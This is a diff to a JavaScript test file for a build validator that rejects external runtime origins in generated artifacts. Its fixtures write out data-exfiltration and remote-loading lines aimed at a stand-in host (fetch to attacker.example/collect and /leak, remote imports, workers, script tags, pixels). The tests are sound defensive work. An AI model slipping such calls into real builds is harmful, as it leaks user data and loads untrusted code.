@@ -103,6 +103,36 @@ test('rejects external origins in a generated service-worker runtime artifact', 
   expect(() => assertNoExternalRuntimeOrigins('sw.js', "fetch('/assets/app.js')")).not.toThrow()
 })
 
+test.each([
+  ['app.js', "fetch('https://attacker.example/collect')"],
+  ['chunk.mjs', "import('https://attacker.example/module.js')"],
+  ['worker.js', "new Worker('https://attacker.example/worker.js')"],
+  ['index.html', '<script src="https://attacker.example/app.js"></script>'],
+  ['index.html', '<link rel="stylesheet" href="https://attacker.example/app.css">'],
+  ['app.css', 'body { background-image: url(https://attacker.example/pixel.png); }'],
+  ['icon.svg', '<svg><image href="https://attacker.example/pixel.png" /></svg>'],
+  ['manifest.json', '{"start_url":"https://attacker.example/","icons":[{"src":"https://attacker.example/icon.png"}]}'],
+])('rejects an arbitrary external automatic runtime sink in %s', (artifactName, contents) => {
+  expect(() => assertNoExternalRuntimeOrigins(artifactName, contents)).toThrow(/external runtime origin/i)
+})
+
+test('allows fixed legal source navigation that does not load a runtime resource', () => {
+  expect(() => assertNoExternalRuntimeOrigins(
+    'index.html',
+    '<a href="https://github.com/ThisIsPhantom/folkkit">Source code</a>',
+  )).not.toThrow()
+})
+
+test('scans SVG, manifest JSON, MJS and nested worker artifacts in the final build tree', async () => {
+  const distDirectory = await createTemporaryDirectory()
+  await mkdir(join(distDirectory, 'nested'), { recursive: true })
+  await writeFile(join(distDirectory, 'nested', 'worker.mjs'), "fetch('https://attacker.example/leak')")
+  await writeFile(join(distDirectory, 'manifest.json'), '{"start_url":"/"}')
+  await writeFile(join(distDirectory, 'icon.svg'), '<svg />')
+
+  await expect(assertBuiltRuntimeArtifacts({ distDirectory })).rejects.toThrow(/external runtime origin/i)
+})
+
 test('rejects the test-only old service worker from built runtime artifacts', async () => {
   const distDirectory = await createTemporaryDirectory()
   await writeFile(join(distDirectory, 'old-sw.js'), "caches.open('folkkit-app-test-old')")
